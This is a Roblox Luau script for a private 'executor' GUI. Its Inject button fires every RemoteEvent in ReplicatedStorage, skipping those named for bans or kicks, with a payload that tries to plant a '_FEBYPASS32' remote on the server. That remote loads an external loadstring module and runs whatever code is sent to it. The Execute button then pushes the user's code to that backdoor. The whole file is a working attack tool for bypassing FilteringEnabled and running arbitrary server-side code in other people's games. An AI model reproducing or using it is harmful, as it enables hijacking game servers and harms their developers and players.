local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local G2L = {}

-- BACKGROUND GUI with clean white theme --

G2L["ScreenGui"] = Instance.new("ScreenGui", playerGui)
G2L["ScreenGui"].Name = "DafUI"
CollectionService:AddTag(G2L["ScreenGui"], "main")

local Frame = Instance.new("Frame", G2L["ScreenGui"])
Frame.Size = UDim2.new(0.35, 0, 0.2, 0)
Frame.Position = UDim2.new(0.325, 0, 0.4, 0)
Frame.BackgroundColor3 = Color3.fromRGB(245, 245, 245) -- nice off-white
Frame.BorderSizePixel = 1
Frame.BorderColor3 = Color3.fromRGB(200, 200, 200)
Frame.Active = true
Frame.Draggable = true
Frame.ClipsDescendants = true
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)

local title = Instance.new("TextLabel", Frame)
title.Size = UDim2.new(1, 0, 0.2, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(30, 30, 30)
title.TextScaled = true
title.Text = "Daf UI (Private)"
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center

local outputBox = Instance.new("TextBox", Frame)
outputBox.ClearTextOnFocus = false
outputBox.MultiLine = true
outputBox.Size = UDim2.new(1, -20, 0.55, -10)
outputBox.Position = UDim2.new(0, 10, 0.2, 10)
outputBox.TextWrapped = true
outputBox.TextColor3 = Color3.fromRGB(40, 40, 40)
outputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
outputBox.BorderColor3 = Color3.fromRGB(200, 200, 200)
outputBox.PlaceholderText = "Enter your code here..."
outputBox.Font = Enum.Font.Code
outputBox.TextSize = 16

-- Buttons container frame --
local buttonsFrame = Instance.new("Frame", Frame)
buttonsFrame.Size = UDim2.new(1, -20, 0.2, 0)
buttonsFrame.Position = UDim2.new(0, 10, 0.75, 0)
buttonsFrame.BackgroundTransparency = 1

local function createButton(text, position)
    local btn = Instance.new("TextButton", buttonsFrame)
    btn.BackgroundColor3 = Color3.fromRGB(0, 120, 215) -- blue accent
    btn.Size = UDim2.new(0, 110, 1, 0)
    btn.Position = position
    btn.Font = Enum.Font.GothamSemibold
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.AutoButtonColor = true
    btn.BorderSizePixel = 0
    btn.ClipsDescendants = true
    btn.Modal = false
    btn.TextWrapped = false
    btn.TextXAlignment = Enum.TextXAlignment.Center
    btn.TextYAlignment = Enum.TextYAlignment.Center
    btn.AutoButtonColor = true
    btn.BackgroundTransparency = 0
    btn.AnchorPoint = Vector2.new(0, 0)
    return btn
end

local exec = createButton("Inject", UDim2.new(0, 0, 0, 0))
local unfe = createButton("Execute", UDim2.new(0, 120, 0, 0))
local clear = createButton("Clear", UDim2.new(0, 240, 0, 0))

-- Inject button logic to create _FEBYPASS32 remote --
exec.MouseButton1Click:Connect(function()
	local function b_G_V12(see)
		local a = function(ree)
			ree:FireServer([[
				local folder = Instance.new('RemoteEvent')
				folder.Name = "_FEBYPASS32"
				folder.Parent = game:GetService("JointsService")
				local loadstring = require(13684410229)
				folder.OnServerEvent:Connect(function(_1,_2)
				   loadstring(_2)()
				end)
			]])
		end
		for i, v in pairs(see:GetChildren()) do
			if v:IsA("RemoteEvent") then
				if not string.match(string.lower(v.Name), "ban") then
					if not string.match(string.lower(v.Name), "kick") then
						a(v)
					end
				end
			end
			b_G_V12(v)
		end
	end
	b_G_V12(game:GetService("ReplicatedStorage"))
	local timetoken = 0
	local maxtime = 5
	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		exec.Text = "Injected"
		exec.BackgroundColor3 = Color3.fromRGB(0, 170, 0) -- green on success
	end
end)

-- Execute button sends TextBox text to _FEBYPASS32 remote --
unfe.MouseButton1Click:Connect(function()
	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(outputBox.Text)
	else
		warn("Failed to loadstring: Error 404")
	end
end)

-- Clear button clears TextBox --
clear.MouseButton1Click:Connect(function()
	outputBox.Text = ""
end)

return G2L["ScreenGui"]
